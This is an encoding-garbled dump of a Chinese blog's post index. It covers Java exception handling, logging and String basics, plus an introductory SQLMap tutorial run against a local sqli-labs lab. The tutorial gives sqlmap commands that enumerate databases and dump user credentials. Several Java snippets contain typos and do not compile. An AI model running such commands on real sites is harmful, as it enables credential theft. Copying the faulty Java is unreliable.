æ•è·å¼‚å¸¸ä½¿ç”¨try...catchè¯­å¥ï¼ŒæŠŠå¯èƒ½å‘ç”Ÿå¼‚å¸¸çš„ä»£ç æ”¾åˆ°try &#123;...&#125;ä¸­ï¼Œç„¶åä½¿ç”¨catchæ•è·å¯¹åº”çš„ExceptionåŠå…¶å­ç±» ï¼š 123456789101112131415161718192021import java.io.UnsupportedEncodingException;import java.util.Arrays;public class Main &#123; public static void main(String[] args) &#123; byte[] bs = toGBK(&quot;ä¸­æ–‡&quot;); System.out.println(Arrary.toString(bs)); &#125; static byte[] toGBK(String s) &#123; try &#123; return s.getBytes(&quot;GBK&quot;); &#125; catch (UnsupportedEncodingException e) &#123; System.out.println(e); return s.getBytes(); //ä½¿ç”¨é»˜è®¤ç¼–ç  &#125; &#125;&#125;// è¾“å‡º// [-42, -48, -50, -60] å¦‚æœæˆ‘ä»¬ä¸æ•è·UnsupportedEncodingExceptionï¼Œåˆ™ä¼šå‡ºç°ç¼–è¯‘å¤±è´¥ï¼Œè¿™æ˜¯å› ä¸ºString.getBytes()æ–¹æ³•çš„å®šä¹‰æ˜¯ï¼š 123public byte[] getBytes(String charsetName) throws UnsupportedEncodingException &#123; ...&#125; æ‰€ä»¥è°ƒç”¨æ–¹åœ¨è°ƒç”¨çš„æ—¶å€™ï¼Œå¿…é¡»å¼ºåˆ¶æ•è·è¿™äº›å¼‚å¸¸ï¼Œå¦åˆ™ç¼–è¯‘å™¨ä¼šæŠ¥é”™ã€‚ å¤šcatchè¯­å¥ å¯ä»¥ä½¿ç”¨å¤šä¸ªcatchè¯­å¥ï¼Œæ¯ä¸ªcatchæ•è·ç›¸å¯¹åº”çš„å¼‚å¸¸ï¼Œä½†æ˜¯ï¼Œå¤šä¸ªcatchè¯­å¥åªæœ‰ä¸€ä¸ªèƒ½è¢«æ‰§è¡Œã€‚æ‰€ä»¥å­˜åœ¨å¤šä¸ªcatchæ—¶å€™ï¼Œcatchçš„é¡ºåºéå¸¸é‡è¦ï¼šå­ç±»å¿…é¡»å†™åœ¨å‰é¢ã€‚ä¾‹å¦‚ï¼š 12345678public static void main(String[] args) &#123; try &#123; ... &#125; catch (IOExcetion c) &#123; System.out.println(&quot;IO error&quot;); &#125; catch (UnsupportedEncodingException e) &#123; // æ°¸è¿œæ•è·ä¸åˆ° System.out.println(&quot;Bad encoding&quot;);&#125; å› ä¸ºUnsupportedEncodingExceptionæ˜¯IOExcetionçš„å­ç±»ï¼Œæ‰€ä»¥å½“æŠ›å‡ºUnsupportedEncodingExceptionå¼‚å¸¸æ—¶ï¼Œä¼šè¢«catch (IOException e) &#123; ... &#125;æ•è·å¹¶æ‰§è¡Œã€‚ finallyè¯­å¥ æ— è®ºæ˜¯å¦æœ‰å¼‚å¸¸å‘ç”Ÿï¼Œå¦‚æœæˆ‘ä»¬éƒ½å¸Œæœ›æ‰§è¡Œä¸€äº›è¯­å¥ï¼Œå¯ä»¥ä½¿ç”¨finallyè¯­å¥ï¼Œä¾‹å¦‚ï¼š 12345678910111213public static void main(String[] args) &#123; try &#123; process1(); process2(); process3(); &#125; catch (UnsupportedEncodingException e) &#123; System.out.println(&quot;Bad encoding&quot;); &#125; catch (IOException e) &#123; System.out.println(&quot;IO error&quot;); &#125; finally &#123; System.out.println(&quot;END&quot;); &#125;&#125; å¦‚æœæŸäº›å¼‚å¸¸çš„å¤„ç†é€»è¾‘ç›¸åŒï¼Œä½†æ˜¯å¼‚å¸¸æœ¬èº«ä¸å­˜åœ¨ç»§æ‰¿å…³ç³»ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨|æ¥åˆå¹¶ï¼š 1234567891011public static void main(String[] args) &#123; try &#123; process1(); process2(); process3(); &#125; catch (IOException | NumberFormatException e) &#123; // IOExceptionæˆ–NumberFormatException System.out.println(&quot;Bad input&quot;); &#125; catch (Exception e) &#123; System.out.println(&quot;Unknown error&quot;); &#125;&#125; æŠ›å‡ºå¼‚å¸¸ æŠ›å‡ºå¼‚å¸¸åˆ†ä¸ºä¸¤æ­¥ï¼š åˆ›å»ºæŸä¸ªExcetionå®ä¾‹ï¼› ç”¨throwè¯­å¥æŠ›å‡ºã€‚ ä¾‹å¦‚ï¼š 12345void process(String s) &#123; if (s == null) &#123; throw new NullPointerExcetion(); &#125;&#125; å¼‚å¸¸è½¬æ¢ 12345678910111213void process1(String s) &#123; try &#123; process2(); &#125; catch (NullPointerExcetion e) &#123; throw new IllegalArgumentExcement; &#125;&#125;void process2(String s) &#123; if (s==null)&#123; throw new NullPonterExcetion(); &#125;&#125; å½“process2()æŠ›å‡ºNullPointerExceptionåï¼Œè¢«process1()æ•è·ï¼Œç„¶åæŠ›å‡ºIllegalArgumentException()ã€‚ å¦‚æœåœ¨main()ä¸­æ•è·IllegalArgumentExceptionï¼Œæˆ‘ä»¬çœ‹çœ‹æ‰“å°çš„å¼‚å¸¸æ ˆï¼š 123456789101112131415161718192021public class Main &#123; public static void main(String[] args) &#123; try &#123; process1(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; static void process1() &#123; try &#123; process2(); &#125; catch (NullPointerException e) &#123; throw new IllegalArgumentException(); &#125; &#125; static void process2() &#123; throw new NullPointerException(); &#125;&#125; å¼‚å¸¸æ ˆå¦‚ä¸‹ï¼š 1234567891011java.lang.IllegalArgumentException at Main.process1(Main.java:15) at Main.main(Main.java:5) at java.base&#x2F;jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at java.base&#x2F;jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at java.base&#x2F;jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.base&#x2F;java.lang.reflect.Method.invoke(Method.java:567) at jdk.compiler&#x2F;com.sun.tools.javac.launcher.Main.execute(Main.java:415) at jdk.compiler&#x2F;com.sun.tools.javac.launcher.Main.run(Main.java:192) at jdk.compiler&#x2F;com.sun.tools.javac.launcher.Main.main(Main.java:132) æˆ‘ä»¬å·²ç»çœ‹ä¸åˆ°åŸå§‹å¼‚å¸¸NullPointerExceptionçš„ä¿¡æ¯äº†ã€‚ ä¸ºäº†èƒ½è¿½è¸ªåˆ°å®Œæ•´çš„å¼‚å¸¸æ ˆï¼Œåœ¨æ„é€ å¼‚å¸¸çš„æ—¶å€™ï¼ŒæŠŠåŸå§‹çš„Exceptionå®ä¾‹ä¼ è¿›å»ï¼Œæ–°çš„Exceptionå°±å¯ä»¥æŒæœ‰åŸå§‹Exceptionä¿¡æ¯ã€‚ å³ï¼š 12345678static void process1() &#123; try &#123; process2(); &#125; catch (NullPointerException e) &#123; throw new IllegalArgumentException(e); &#125; &#125; å¼‚å¸¸æ ˆå¦‚ä¸‹ï¼š 1234567java.lang.IllegalArgumentException: java.lang.NullPointerException at Main.process1(Main.java:15) at Main.main(Main.java:5)Caused by: java.lang.NullPointerException at Main.process2(Main.java:20) at Main.process1(Main.java:13) è‡ªå®šä¹‰å¼‚å¸¸ ä¸€ä¸ªå¸¸è§çš„åšæ³•æ˜¯è‡ªå®šä¹‰ä¸€ä¸ªBaseExceptionä½œä¸ºâ€œæ ¹å¼‚å¸¸â€ï¼Œç„¶åï¼Œæ´¾ç”Ÿå‡ºå„ç§ä¸šåŠ¡ç±»å‹çš„å¼‚å¸¸ã€‚ BaseExceptionéœ€è¦ä»ä¸€ä¸ªé€‚åˆçš„Exceptionæ´¾ç”Ÿï¼Œé€šå¸¸å»ºè®®ä»RuntimeExceptionæ´¾ç”Ÿï¼š 123public class BaseException extends RuntimeExcetion &#123;&#125; å…¶ä»–ä¸šåŠ¡ç±»å‹çš„å¼‚å¸¸å°±å¯ä»¥ä»BaseExceptionæ´¾ç”Ÿï¼š 12345678public class UserNotFoundException extends BaseException &#123;&#125;public class LoginFailedException extends BaseException &#123;&#125;... ä½¿ç”¨JDK Logging ç›´æ¥ä¸ŠğŸŒ° 12345678910111213import java.util.logging.Level;import java.util.logging.Logger;public class Hello &#123; public static void main(String[] args) &#123; Logger logger = Logger.getGlobal(); logger.info(&quot;start process...&quot;); logger.warning(&quot;memory is running out...&quot;); logger.fine(&quot;ignore&quot;); logger.severe(&quot;process will be terminated...&quot;); &#125;&#125; è¾“å‡ºï¼š 123456710æœˆ 12, 2019 6:34:55 ä¸‹åˆ Hello mainä¿¡æ¯: start process...10æœˆ 12, 2019 6:34:55 ä¸‹åˆ Hello mainè­¦å‘Š: memory is running out...10æœˆ 12, 2019 6:34:55 ä¸‹åˆ Hello mainä¸¥é‡: process will be terminated... logger.fine(&quot;ignore&quot;);æ²¡æœ‰æ‰“å°æ˜¯å› ä¸ºJDKé»˜è®¤çš„æ¶ˆæ¯çº§åˆ«æ˜¯Infoï¼š SEVERE WARNING INFO CONFIG FINE FINER FINEST ä½¿ç”¨Common Logging ä½¿ç”¨ Common Loggingåªéœ€è¦ä¸¤ä¸ªæ­¥éª¤ï¼š é€šè¿‡LogFactoryè·å–Logç±»çš„å®ä¾‹ ä½¿ç”¨Logå®ä¾‹çš„æ–¹æ³•æ‰“å°æ—¥å¿— 1234567891011import org.apache.commons.logging.Log;import org.apache.commons.logging.LogFactory;public class Main &#123; public static void main(String[] args) &#123; Log log = LogFactory.getLog(Main.class); log.info(&quot;start...&quot;); log.warn(&quot;end...&quot;); &#125;&#125; Commons Loggingå®šä¹‰äº†6ä¸ªæ—¥å¿—çº§åˆ«ï¼š FATAL ERROR WARNING INFO DEBUG TRACE ä½¿ç”¨Common Loggingæ—¶ï¼Œå¦‚æœåœ¨é™æ€æ–¹æ³•ä¸­å¼•ç”¨Logï¼Œé€šå¸¸ç›´æ¥å®šä¹‰ä¸€ä¸ªé™æ€ç±»å‹å˜é‡ï¼š 12345678public class Main&#123; static final Log log = LogFactory.getLog(Main.class); static void foo()&#123; log.info(&quot;foo&quot;); &#125;&#125; åœ¨å®ä¾‹æ–¹æ³•ä¸­å¼•ç”¨Logï¼Œé€šè¿‡å®šä¹‰ä¸€ä¸ªå®ä¾‹å˜é‡ï¼š 12345678public class Person &#123; protected final Log = LogFactory.getLog(getClass()); void foo()&#123; log.info(&quot;foo&quot;); &#125;&#125; è¿™ä¸¤ç§å®šä¹‰çš„æ–¹æ³•åŒºåˆ«åœ¨äºï¼šå®ä¾‹å˜é‡logè·å–æ–¹å¼æ˜¯LogFactory.getLog(getClass)ï¼Œè¿™ç§åšæ³•çš„å¥½å¤„æ˜¯ï¼Œå­ç±»å¯ä»¥ç›´æ¥ä½¿ç”¨logå®ä¾‹ï¼Œä¾‹å¦‚ï¼š 123456public class Student extends Person &#123; void bar() &#123; log.info(&quot;bar&quot;); &#125;&#125; æ­¤å¤–ï¼ŒCommons Loggingçš„æ—¥å¿—æ–¹æ³•ï¼Œä¾‹å¦‚info()ï¼Œé™¤äº†æ ‡å‡†çš„info(String)å¤–ï¼Œè¿˜æä¾›äº†ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„é‡è½½æ–¹æ³•ï¼šinfo(String, Throwable)ï¼Œè¿™ä½¿å¾—è®°å½•å¼‚å¸¸æ›´åŠ ç®€å•ï¼š 123456try &#123; ...&#125; catch (Exception e) &#123; log.error(&quot;got Exception&quot;, e);&#125; ä½¿ç”¨Log4j Commons Loggingï¼Œå¯ä»¥ä½œä¸ºâ€œæ—¥å¿—æ¥å£â€æ¥ä½¿ç”¨ï¼Œè€Œå®ç°è¿™ä¸ªæ¥å£å¯ä»¥ä½¿ç”¨Log4jã€‚ æˆ‘ä»¬åœ¨ä½¿ç”¨Log4jæ¡†æ¶æ—¶ï¼Œæ›´å¤šæ—¶å€™æ˜¯é€šè¿‡é…ç½®æ–‡ä»¶æ¥é…ç½®å®ƒã€‚ ä»¥XMLé…ç½®ä¸ºä¾‹ï¼Œä½¿ç”¨Log4jçš„æ—¶å€™ï¼Œæˆ‘ä»¬æŠŠä¸€ä¸ªlog4j2.xmlçš„æ–‡ä»¶æ”¾åˆ°classpathä¸‹å°±å¯ä»¥è®©Log4jè¯»å–é…ç½®æ–‡ä»¶å¹¶æŒ‰ç…§æˆ‘ä»¬çš„é…ç½®æ¥è¾“å‡ºæ—¥å¿—ã€‚ å¦å¤–ï¼Œå› ä¸ºLog4jä¹Ÿæ˜¯ä¸€ä¸ªç¬¬ä¸‰æ–¹åº“ï¼Œéœ€è¦æŠŠä¸‹é¢4ä¸ªjaråŒ…æ”¾åœ¨classpathä¸­ï¼š log4j-api-2.x.jar log4j-core-2.x.jar log4j-jcl-2.x.jar commons-logging-1.2.jar ä½¿ç”¨SLF4Jå’ŒLogback SLF4Jç±»ä¼¼äºCommons Loggingï¼Œä¹Ÿæ˜¯ä¸€ä¸ªæ—¥å¿—æ¥å£ï¼Œè€ŒLogbackç±»ä¼¼äºLog4jï¼Œæ˜¯ä¸€ä¸ªæ—¥å¿—çš„å®ç°ã€‚ SLF4Jä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š 12345678910111213import org.slf4j.Logger;import org.slf4j.LoggerFactory;class Main &#123; final Logger = LoggerFactory.getLogger(getClass()); void foo() &#123; int bar = 100; String name = &quot;foo&quot;; logger.info(&quot;bar = &#123;&#125; name = &#123;&#125;&quot;, bar, name); &#125;&#125; SLF4Jä½¿ç”¨ä¸‹é¢ä¸‰ä¸ªjaråŒ…ï¼š slf4j-api-1.7.x.jar logback-classic-1.2.x.jar logback-core-1.2.x.jar å’ŒLog4jç±»ä¼¼ï¼Œæˆ‘ä»¬ä»ç„¶éœ€è¦ä¸€ä¸ªLogbackçš„é…ç½®æ–‡ä»¶ï¼ŒæŠŠlogback.xmlæ”¾åˆ°classpathä¸‹ã€‚","tags":[{"name":"java","slug":"java","permalink":"http://ca0y1h.top/tags/java/"}],"categories":[{"name":"ç¼–ç¨‹","slug":"ç¼–ç¨‹","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/"},{"name":"java","slug":"ç¼–ç¨‹/java","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/java/"}]},{"title":"Webå®‰å…¨å­¦ä¹ ä¹‹SQLMapå…¥é—¨å­¦ä¹ ","date":"2019-10-11T08:47:22.000Z","path":"Web_security/basic_learning/10.SQLMapå…¥é—¨å­¦ä¹ /","text":"Webå®‰å…¨å­¦ä¹ ä¹‹SQLMapå…¥é—¨å­¦ä¹  SQLMapæ³¨å…¥ç¥å™¨ï¼Œå…ˆå°±ç®€å•çš„ä»‹ç»ä¸€ä¸‹æœ€æœ€æœ€æœ€åŸºç¡€çš„ç”¨æ³•ï¼Œç­‰å›¾ä¹¦é¦†ä»€ä¹ˆæ—¶å€™æ”¶å½•äº†ã€ŠSQLMapä»å…¥é—¨åˆ°ç²¾é€šã€‹è¿™æœ¬ä¹¦ï¼Œå†è®¤çœŸç ”ç©¶è¿™ä¸ªå·¥å…·ï¼ˆå…¶å®çœ‹åˆ°è¿™ä¸ªä¹¦åå°±æœ‰ç‚¹ä¸é€‚ï¼‰ã€‚ ä½¿ç”¨SQLMap ä½¿ç”¨sqli-labsçš„æ•°æ®åº“å’Œé¡µé¢ä½œä¸ºç¤ºä¾‹ã€‚ å·²çŸ¥å­˜åœ¨æ³¨å…¥ç‚¹http://localhost/sqlilabs/Less-1/ï¼Œä½¿ç”¨SQLMapå¯¹å…¶æå–ç®¡ç†å‘˜æ•°æ®ï¼Œå…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š ç¬¬ä¸€æ­¥ï¼šåˆ¤æ–­æ˜¯å¦æ˜¯æ³¨å…¥ç‚¹ sqlmap.py -u &quot;http://localhost/sqlilabs/Less-1/?id=1&quot; ä½¿ç”¨-uå‚æ•°æŒ‡å®šURLï¼Œå¦‚æœURLå­˜åœ¨æ³¨å…¥ç‚¹ï¼Œå°†ä¼šæ˜¾ç¤ºå‡ºWebå®¹å™¨ï¼Œæ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š ç¬¬äºŒæ­¥ï¼šè·å–æ•°æ®åº“ sqlmap.py -u &quot;http://localhost/sqlilabs/Less-1/?id=1&quot; --dbs ä½¿ç”¨--dbså‚æ•°è¯»å–æ•°æ®åº“ï¼Œå¦‚ä¸‹ï¼š ç¬¬ä¸‰æ­¥ï¼šæŸ¥çœ‹å½“å‰åº”ç”¨ç¨‹åºæ‰€ç”¨æ•°æ®åº“ sqlmap.py -u &quot;http://localhost/sqlilabs/Less-1/?id=1&quot; --current-db ç¬¬å››æ­¥ï¼šåˆ—å‡ºæŒ‡å®šæ•°æ®åº“çš„æ‰€æœ‰è¡¨ sqlmap.py -u &quot;http://localhost/sqlilabs/Less-1/?id=1&quot; --tables -D &quot;security&quot; ä½¿ç”¨--tableå‚æ•°è·å–æ•°æ®åº“è¡¨ï¼Œ-Då‚æ•°æŒ‡å®šæ•°æ®åº“ï¼Œå¦‚ä¸‹ï¼š ç¬¬äº”æ­¥ï¼šè¯»å–æŒ‡å®šè¡¨ä¸­çš„å­—æ®µåç§° sqlmap.py -u &quot;http://localhost/sqlilabs/Less-1/?id=1&quot; --columns -T &quot;users&quot; -D &quot;security&quot; ä½¿ç”¨--columnså‚æ•°åˆ—å–å­—æ®µåï¼Œå¦‚ä¸‹ï¼š ç¬¬å…­æ­¥ï¼šè¯»å–æŒ‡å®šå­—æ®µå†…å®¹ sqlmap.py -u &quot;http://localhost/sqlilabs/Less-1/?id=1&quot; --dump -C &quot;username, password&quot; -T &quot;users&quot; -D &quot;security&quot; --dumpæ„å‘³è½¬å­˜æ•°æ®ï¼Œ-CæŒ‡å®šå­—æ®µåç§°ï¼Œ-TæŒ‡å®šè¡¨åï¼Œ-DæŒ‡å®šæ•°æ®åº“åç§°ã€‚ åœ¨è¯»å–æ•°æ®åï¼ŒSQLMapä¼šæŠŠè¯»å–çš„æ•°æ®è½¬å­˜åˆ°SQLMap/output/ç›®å½•ä¸‹ã€‚","tags":[{"name":"sqlæ³¨å…¥","slug":"sqlæ³¨å…¥","permalink":"http://ca0y1h.top/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"SQLMap","slug":"SQLMap","permalink":"http://ca0y1h.top/tags/SQLMap/"}],"categories":[{"name":"webå®‰å…¨","slug":"webå®‰å…¨","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"åŸºç¡€å­¦ä¹ ","slug":"webå®‰å…¨/åŸºç¡€å­¦ä¹ ","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"JavaåŸºç¡€å­¦ä¹ ä¹‹æ ¸å¿ƒç±»","date":"2019-10-11T08:14:01.000Z","path":"Java/code/2.JavaåŸºç¡€å­¦ä¹ ä¹‹æ ¸å¿ƒç±»/","text":"JavaåŸºç¡€å­¦ä¹ ä¹‹æ ¸å¿ƒç±» å­—ç¬¦ä¸² Stringæ˜¯ä¸€ä¸ªå¼•ç”¨ç±»å‹ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªç±»ï¼Œå®ƒçš„ä¸€ä¸ªé‡è¦ç‰¹ç‚¹å°±æ˜¯ä¸å¯å˜ï¼Œè¿™ç§ä¸å¯å˜æ€§æ˜¯é€šè¿‡å†…éƒ¨çš„private final char[]å­—æ®µï¼Œä»¥åŠæ²¡æœ‰ä»»ä½•ä¿®æ”¹char[]çš„æ–¹æ³•å®ç°çš„ã€‚ å­—ç¬¦ä¸²æ¯”è¾ƒ å½“æˆ‘ä»¬æƒ³è¦æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ç›¸åŒæ—¶ï¼Œè¦ç‰¹åˆ«æ³¨æ„ï¼Œæˆ‘ä»¬å®é™…ä¸Šæ˜¯æƒ³æ¯”è¾ƒå­—ç¬¦ä¸²çš„å†…å®¹æ˜¯å¦ç›¸åŒã€‚å¿…é¡»ä½¿ç”¨equals()æ–¹æ³•è€Œä¸èƒ½ç”¨==ã€‚ 12345678public class Main() &#123; public static void main(String[] args) &#123; String s1 = &quot;hello&quot;; String s2 = &quot;HELLO&quot;.toLowerCase(); System.out.println(s1 == s2); System.out.println(s1.equals(s2)); &#125;&#125; è¦å¿½ç•¥å¤§å°å†™æ¯”è¾ƒï¼Œä½¿ç”¨equalsIgnoreCase()æ–¹æ³•ã€‚ æœç´¢å­ä¸²çš„ä¾‹å­ï¼š 1234&quot;Hello&quot;.indexof(&quot;l&quot;); // 2&quot;Hello&quot;.lastIndexof(&quot;l&quot;); //3&quot;Hello&quot;.startsWith(&quot;He&quot;); // true&quot;Hello&quot;.endsWith(&quot;lo&quot;); //true æå–å­ä¸²çš„ä¾‹å­ï¼š 12&quot;Hello&quot;.substring(2); //&quot;llo&quot;&quot;Hello&quot;.substring(2, 4); //&quot;llo&quot; å»é™¤é¦–å°¾ç©ºç™½å­—ç¬¦ ä½¿ç”¨trim()æ–¹æ³•å¯ä»¥ç§»é™¤å­—ç¬¦ä¸²é¦–å°¾ç©ºç™½å­—ç¬¦ã€‚ç©ºç™½å­—ç¬¦åŒ…æ‹¬ç©ºæ ¼ï¼Œ\\tï¼Œ\\rï¼Œ\\nã€‚ æ³¨æ„ï¼štrim()å¹¶æ²¡æœ‰æ”¹å˜å­—ç¬¦ä¸²çš„å†…å®¹ï¼Œè€Œæ˜¯è¿”å›äº†ä¸€ä¸ªæ–°å­—ç¬¦ä¸²ã€‚ å¦ä¸€ä¸ªstrip()æ–¹æ³•ä¹Ÿå¯ä»¥ç§»é™¤å­—ç¬¦ä¸²é¦–å°¾ç©ºç™½å­—ç¬¦ï¼ŒåŒ…æ‹¬ä¸­æ–‡çš„ç©ºæ ¼å­—ç¬¦\\u3000ã€‚ Stringè¿˜æä¾›äº†isEmpty()å’ŒisBlank()æ¥åˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¦ä¸ºç©ºå’Œç©ºç™½å­—ç¬¦ä¸²ã€‚ æ›¿æ¢å­ä¸² ä½¿ç”¨replace()æ–¹æ³•å¯ä»¥æ ¹æ®å­—ç¬¦æˆ–å­—ç¬¦ä¸²æ›¿æ¢ï¼š 123String s = &quot;hello&quot;;s.replace(&#x27;l&#x27;, &#x27;w&#x27;); // &quot;hewwo&quot;s.replace(&#x27;ll&#x27;, &quot;~~&quot;); // &quot;he~~o&quot; åˆ†å‰²å­—ç¬¦ä¸² split()æ–¹æ³•æ ¹æ®åŒ¹é…ç»™å®šçš„æ­£åˆ™è¡¨è¾¾å¼æ¥æ‹†åˆ†å­—ç¬¦ä¸²ã€‚æ³¨æ„ï¼š . ã€ |å’Œ * ç­‰è½¬ä¹‰å­—ç¬¦ï¼Œå¿…é¡»å¾—åŠ  \\\\ã€‚ 12String s = &quot;A,B,C,D&quot;;String[] ss = s.split(&quot;\\\\,&quot;); // &#123;&quot;A&quot;, &quot;B&quot;, &quot;C&quot;, &quot;D&quot;&#125; æ‹¼æ¥å­—ç¬¦ä¸² æ‹¼æ¥å­—ç¬¦ä¸²ä½¿ç”¨é™æ€æ–¹æ³•join()ï¼Œå®ƒç”¨æŒ‡å®šçš„å­—ç¬¦ä¸²è¿æ¥å­—ç¬¦ä¸²æ•°ç»„ï¼š 12String[] arr = &#123;&quot;A&quot;, &quot;B&quot;, &quot;C&quot;&#125;;String s = String.join(&quot;***&quot;, arr); // &quot;A***B***C&quot; ç±»å‹è½¬æ¢ é™æ€æ–¹æ³•valueOf()å¯ä»¥å§ä»»æ„åŸºæœ¬ç±»å‹æˆ–å¼•ç”¨ç±»å‹è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚ 1234String.valueOf(123); //&quot;123&quot;String.valueOf(45.67); //&quot;45.67&quot;String.valueOf(true); //&quot;true&quot;String.valueOf(new Object()); //java.lang.Object@40f08448 å­—ç¬¦ä¸²è½¬æ¢ä¸ºintç±»å‹ï¼š 12int n1 = Integer.parseInt(&quot;123&quot;); //123int n2 = Integer.parseInt(&quot;ff&quot;, 16); //æŒ‰åå…­è¿›åˆ¶è½¬æ¢ï¼Œ255 å­—ç¬¦ä¸²è½¬æ¢ä¸ºbooleanç±»å‹ï¼š 123boolean b1 = Boolean.parseBoolean(&quot;true&quot;);boolean b2 = Boolean.parseBoolean(&quot;FALSE&quot;); è½¬æ¢ä¸ºchar[] Stringå’Œcharå¯ä»¥äº’ç›¸è½¬æ¢ï¼š 123char[] cs = &quot;Hello&quot;.toCharArray();String s = new String(cs); å¦‚æœä¿®æ”¹äº†char[]æ•°ç»„ï¼ŒStringå¹¶ä¸ä¼šæ”¹å˜ï¼š 1234567891011121314public class Main &#123; public static void Main(String[] args) &#123; char[] cs = &quot;Hello&quot;.toCharArray(); String s = new String(cs); System.out.println(s); cs[0] = &#x27;X&#x27;; System.out.println(s); &#125;&#125;// è¾“å‡º// Hello// Hello è¿™æ˜¯å› ä¸ºé€šè¿‡new String(char[])åˆ›å»ºæ–°çš„Stringå®ä¾‹æ—¶ï¼Œå®ƒå¹¶ä¸ä¼šç›´æ¥å¼•ç”¨ä¼ å…¥çš„char[]æ•°ç»„ï¼Œè€Œæ˜¯ä¼šå¤åˆ¶ä¸€ä»½ï¼Œæ‰€ä»¥ï¼Œä¿®æ”¹å¤–éƒ¨çš„char[]æ•°ç»„ä¸ä¼šå½±å“Stringå®ä¾‹å†…éƒ¨çš„char[]æ•°ç»„ï¼Œå› ä¸ºè¿™æ˜¯ä¸¤ä¸ªä¸åŒçš„æ•°ç»„ã€‚ æ‰€ä»¥ï¼Œå¦‚æœä¼ å…¥çš„å¯¹è±¡æœ‰å¯èƒ½æ”¹å˜ï¼Œæˆ‘ä»¬éœ€è¦å¤åˆ¶è€Œä¸æ˜¯ç›´æ¥å¼•ç”¨ï¼Œä¾‹å¦‚ï¼š 1234567891011121314151617181920212223242526import java.util.Arrays;public class Main &#123; public static void main(String[] args) &#123; int[] scores = new int[] &#123;88, 99, 11, 22, 33&#125;; Score s = new Score(scores); s.printScores(); scores[2] = 55; s.printScores; &#125;&#125;class Score &#123; private int[] scores; public Score(int[] scores) &#123; this.scores = scores; &#125; public void printScores() &#123; System.out.println(Arrays.toString(scores)); &#125;&#125;// è¾“å‡º// 88, 99, 11, 22, 33// 88, 99, 55, 22, 33 è§‚å¯Ÿä¸¤æ¬¡è¾“å‡ºï¼Œç”±äºScoreå†…éƒ¨ç›´æ¥å¼•ç”¨äº†å¤–éƒ¨ä¼ å…¥çš„int[]æ•°ç»„ï¼Œè¿™ä¼šé€ æˆå¤–éƒ¨ä»£ç å¯¹int[]æ•°ç»„çš„ä¿®æ”¹ï¼Œå½±å“åˆ°Scoreç±»çš„å­—æ®µã€‚æ­£ç¡®çš„æ„é€ å‡½æ•°å¦‚ä¸‹ï¼š 1234public Score(int[] scores) &#123; this.scores = scores.clone(); &#125; StringBuilder StringBuilderæ˜¯ä¸€ä¸ªå¯å˜å¯¹è±¡ï¼Œèƒ½é«˜æ•ˆæ‹¼æ¥å­—ç¬¦ä¸²ï¼Œå¾€StringBuilderä¸­æ–°å¢å­—ç¬¦æ—¶ï¼Œä¸ä¼šåˆ›å»ºæ–°çš„ä¸´æ—¶å¯¹è±¡ã€‚ 1234567891011StringBuilder sb = new StringBuilder(1024);for (int i = 0; i &lt; 1000; i++) &#123; sb.append(&#x27;,&#x27;); sb.append(i);&#125;String s = sb.toString();System.out.println(s);// è¾“å‡º// 0,1,2,3...999 æ­¤å¤–ï¼ŒStringBuilderè¿˜å¯ä»¥è¿›è¡Œé“¾å¼æ“ä½œï¼š 1234567891011121314public class Main &#123; public static void main(String[] args) &#123; var sb = new StringBuilder(1024); sb.append(&quot;Mr&quot;) .append(&quot;Bob&quot;) .append(&quot;!&quot;) .insert(0, &quot;Hello, &quot;); System.out.println(sb.toString()); &#125;&#125;// è¾“å‡º// Hello, Mr Bob! æ”¯æŒé“¾å¼æ“ä½œçš„å…³é”®å¯ä»¥ä»StringBuilderæºç çœ‹å‡ºï¼š 12345678910111213141516public StringBuilder append(String str) &#123; super.append(str); return this; &#125; public AbstractStringBuilder append(String str) &#123; if (str == null) &#123; return appendNull(); &#125; int len = str.length(); ensureCapacityInternal(count + len); putStringAt(count, str); count += len; return this; &#125; å®šä¹‰çš„append()æ–¹æ³•ä¼šè¿”å›thisï¼Œè¿™æ ·ï¼Œå°±å¯ä»¥ä¸æ–­è°ƒç”¨è‡ªèº«çš„å…¶ä»–æ–¹æ³•ã€‚ æ¨¡ä»¿StringBuilderè®¾è®¡ä¸€ä¸ªå¯ä»¥ä¸æ–­å¢åŠ çš„è®¡æ•°å™¨ï¼š 1234567891011121314151617181920212223242526272829303132public class Main &#123; public static void main(String[] args) &#123; Adder adder = new Adder(); adder.add(2) .add(5) .inc() .add(10); System.out.println(adder.value()) &#125;&#125;class Adder &#123; private int sum = 0; public Adder add(int n) &#123; sum += n; return this; &#125; public Adder inc() &#123; sum ++; return this; &#125; public int value() &#123; return sum; &#125;&#125;// è¾“å‡º// 18 ç»ƒä¹  è¯·ä½¿ç”¨StringBuilderæ„é€ ä¸€ä¸ªINSERTSQLè¯­å¥ï¼š 12345678910111213141516171819202122232425262728293031323334353637package com.itranswarp.learnjava;/** * Learn Java from https://www.liaoxuefeng.com/ * * @author liaoxuefeng */public class Main &#123; public static void main(String[] args) &#123; String[] fields = &#123; &quot;name&quot;, &quot;position&quot;, &quot;salary&quot; &#125;; String table = &quot;employee&quot;; String insert = buildInsertSql(table, fields); System.out.println(insert); System.out.println( &quot;INSERT INTO employee (name, position, salary) VALUES (?, ?, ?)&quot;.equals(insert) ? &quot;æµ‹è¯•æˆåŠŸ&quot; : &quot;æµ‹è¯•å¤±è´¥&quot;); &#125; static String 